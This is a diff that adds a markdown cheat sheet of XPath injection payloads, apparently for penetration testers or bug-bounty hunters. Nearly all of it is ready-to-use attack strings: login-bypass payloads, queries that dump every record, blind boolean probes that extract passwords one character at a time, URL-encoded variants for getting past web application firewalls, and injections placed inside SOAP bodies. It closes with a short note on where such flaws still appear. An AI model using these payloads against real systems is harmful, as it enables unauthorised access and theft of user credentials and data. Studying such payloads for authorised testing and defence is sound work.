@@ -1,0 +1,84 @@
+# XPath Injection Payloads
+
+## AUTH BYPASS
+Suppose query: `//user[username/text()='$user' and password/text()='$pass']`
+```
+' or '1'='1
+' or '1'='1' or 'x'='y
+' or true() or '
+' or count(.//*)=0 or '
+'
+or 1=1
+or 1=1 or ''='
+| //user[position()=1]
+| //user[username='admin' and password='' or 1=1] |
+```
+Comment-based (`<!--` style for xpath):
+```
+' ) or 1=1 )) or (( 1=1
+```
+
+## DATA EXTRACTION (dump everything)
+```
+' or 1=1
+' or '1'='1' or '
+* | *
+string(//*)
+//* | //@*
+| //*
+|  //*
+count(//*)  (0 → nothing)
+```
+Extract first user:
+```
+//user[position()=1] | //user[position()=2]
+//user[1] | //user[2]
+(//user)[1] | (//user)[2]
+```
+Extract attributes:
+```
+//* | //@*
+//@* | //*
+string(//user[1]/username)
+```
+
+## BLIND BOOLEAN EXTRACTION
+Same pattern as SQLi boolean — guess char by char:
+```
+' or substring(//user[1]/password/text(),1,1)='a' or 'x'='y
+' or contains(//user[1]/username/text(),'a') or 'x'='y
+' or string-length(//user[1]/password/text())=6 or 'x'='y
+' or starts-with(//user[1]/email/text(),'n') or 'x'='y
+```
+
+## REPORT-READY COMBO
+If the app uses something like:
+```
+//users/user[name='X']
+```
+Inject:
+```
+' or '1'='1' or ''='
+```
+And every record shows — screenshot beats a description.
+
+## ENCODED VARIANTS (WAF)
+```
+%27%20or%20%271%27=%271
+%2527%2520or%2520%25271%2527=%25271
+'+or+'1'%3d'1'+or+'
+' or '1'='1%00
+```
+
+## XML/XPath in SOAP bodies
+```
+<id>' or '1'='1</id>
+<name>abc) or 1=1</name>
+```
+
+## NOTE ON REAL-WORLD RELEVANCE
+Modern apps rarely use raw XPath (they use XML libraries with parameterized XPath) — but it still appears in:
+- Legacy Java `.xml` config-based auth
+- Document-index / CMS search features
+- Some "workflow engine" products (report origin, "injxd" style)
+When you see it, it's often an easy High.
